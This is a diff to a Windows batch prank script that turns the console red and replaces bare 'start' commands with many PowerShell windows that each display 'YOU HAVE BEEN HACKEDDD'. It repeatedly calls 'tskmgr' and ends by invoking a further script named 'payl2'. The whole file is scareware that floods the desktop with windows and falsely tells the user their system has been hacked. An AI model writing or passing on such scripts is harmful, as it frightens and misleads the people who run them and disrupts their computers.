@@ -1,13 +1,12 @@
 @Echo OFF
-echo Happy Death
 color 4
-start
-start
-start
-start
-start
-start
-start
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
 tskmgr
 tskmgr
 tskmgr
@@ -20,14 +19,14 @@ tskmgr
 tskmgr
 tskmgr
 tskmgr
-start
-start
-start
-start
-start
-start
-start
-start
-start
-start
-batsw_cmdsxu
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
+start powershell write-host -back blue -fore red YOU HAVE BEEN HACKEDDD 
+payl2
